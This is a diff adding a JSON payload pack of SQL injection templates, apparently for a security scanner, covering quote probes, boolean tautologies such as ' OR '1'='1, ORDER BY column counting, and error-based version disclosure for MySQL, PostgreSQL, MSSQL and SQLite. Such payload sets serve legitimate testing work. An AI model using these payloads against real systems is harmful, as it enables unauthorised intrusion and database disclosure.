@@ -1,0 +1,196 @@
+{
+  "pack": "builtin-sqli",
+  "category": "sqli",
+  "source": "builtin",
+  "license": "MIT",
+  "templates": [
+    {
+      "id": "sqli-generic-detect-squote",
+      "name": "Single quote error probe",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "string",
+      "mode": "detection",
+      "template": "'",
+      "tags": ["detection", "error"],
+      "notes": "A lone quote often triggers a SQL syntax error in string contexts."
+    },
+    {
+      "id": "sqli-generic-detect-dquote",
+      "name": "Double quote error probe",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "string",
+      "mode": "detection",
+      "template": "\"",
+      "tags": ["detection", "error"]
+    },
+    {
+      "id": "sqli-generic-detect-backslash",
+      "name": "Backslash probe",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "string",
+      "mode": "detection",
+      "template": "\\",
+      "tags": ["detection"]
+    },
+    {
+      "id": "sqli-generic-bool-true-string",
+      "name": "Boolean true (string)",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "string",
+      "mode": "boolean",
+      "template": "' OR '1'='1",
+      "tags": ["boolean"]
+    },
+    {
+      "id": "sqli-generic-bool-false-string",
+      "name": "Boolean false (string)",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "string",
+      "mode": "boolean",
+      "template": "' AND '1'='2",
+      "tags": ["boolean"],
+      "notes": "Pair with the true probe; differing responses suggest injection."
+    },
+    {
+      "id": "sqli-generic-bool-comment-string",
+      "name": "Boolean true with comment (string)",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "string",
+      "mode": "boolean",
+      "template": "' OR 1=1-- -",
+      "tags": ["boolean", "comment"]
+    },
+    {
+      "id": "sqli-generic-bool-true-numeric",
+      "name": "Boolean true (numeric)",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "numeric",
+      "mode": "boolean",
+      "template": "1 OR 1=1",
+      "tags": ["boolean"]
+    },
+    {
+      "id": "sqli-generic-bool-false-numeric",
+      "name": "Boolean false (numeric)",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "numeric",
+      "mode": "boolean",
+      "template": "1 AND 1=2",
+      "tags": ["boolean"]
+    },
+    {
+      "id": "sqli-generic-bool-comment-numeric",
+      "name": "Boolean true with comment (numeric)",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "numeric",
+      "mode": "boolean",
+      "template": "1 OR 1=1-- -",
+      "tags": ["boolean", "comment"]
+    },
+    {
+      "id": "sqli-generic-search-bool",
+      "name": "Search context boolean",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "search",
+      "mode": "boolean",
+      "template": "%' OR '1'='1",
+      "tags": ["boolean", "search"]
+    },
+    {
+      "id": "sqli-generic-order-1",
+      "name": "ORDER BY column probe 1",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "numeric",
+      "mode": "union",
+      "template": "1 ORDER BY 1-- -",
+      "tags": ["union", "enumeration"],
+      "notes": "Increment the column number until the query errors to count columns."
+    },
+    {
+      "id": "sqli-generic-order-string",
+      "name": "ORDER BY column probe (string)",
+      "category": "sqli",
+      "engine": "generic",
+      "context": "string",
+      "mode": "union",
+      "template": "' ORDER BY 1-- -",
+      "tags": ["union", "enumeration"]
+    },
+
+    {
+      "id": "sqli-mysql-error-extractvalue",
+      "name": "MySQL extractvalue error",
+      "category": "sqli",
+      "engine": "mysql",
+      "context": "string",
+      "mode": "error",
+      "template": "' AND extractvalue(1,concat(0x7e,version()))-- -",
+      "tags": ["error", "version"],
+      "notes": "Non-destructive error-based version disclosure on MySQL >= 5.1."
+    },
+    {
+      "id": "sqli-mysql-comment-hash",
+      "name": "MySQL hash comment boolean",
+      "category": "sqli",
+      "engine": "mysql",
+      "context": "string",
+      "mode": "boolean",
+      "template": "' OR 1=1#",
+      "tags": ["boolean", "comment"]
+    },
+    {
+      "id": "sqli-postgres-error-cast",
+      "name": "PostgreSQL cast error",
+      "category": "sqli",
+      "engine": "postgres",
+      "context": "string",
+      "mode": "error",
+      "template": "' AND 1=cast(version() as int)-- -",
+      "tags": ["error", "version"],
+      "notes": "Type-cast error reveals version() on PostgreSQL."
+    },
+    {
+      "id": "sqli-mssql-error-convert",
+      "name": "MSSQL convert error",
+      "category": "sqli",
+      "engine": "mssql",
+      "context": "string",
+      "mode": "error",
+      "template": "' AND 1=convert(int,@@version)-- -",
+      "tags": ["error", "version"],
+      "notes": "Conversion error discloses @@version on Microsoft SQL Server."
+    },
+    {
+      "id": "sqli-sqlite-error-version",
+      "name": "SQLite version probe",
+      "category": "sqli",
+      "engine": "sqlite",
+      "context": "string",
+      "mode": "error",
+      "template": "' AND 1=sqlite_version()-- -",
+      "tags": ["error", "version"],
+      "notes": "Comparison with sqlite_version() can surface behavioural differences."
+    },
+    {
+      "id": "sqli-mysql-bool-numeric",
+      "name": "MySQL numeric boolean",
+      "category": "sqli",
+      "engine": "mysql",
+      "context": "numeric",
+      "mode": "boolean",
+      "template": "1 OR 1=1#",
+      "tags": ["boolean"]
+    }
+  ]
+}
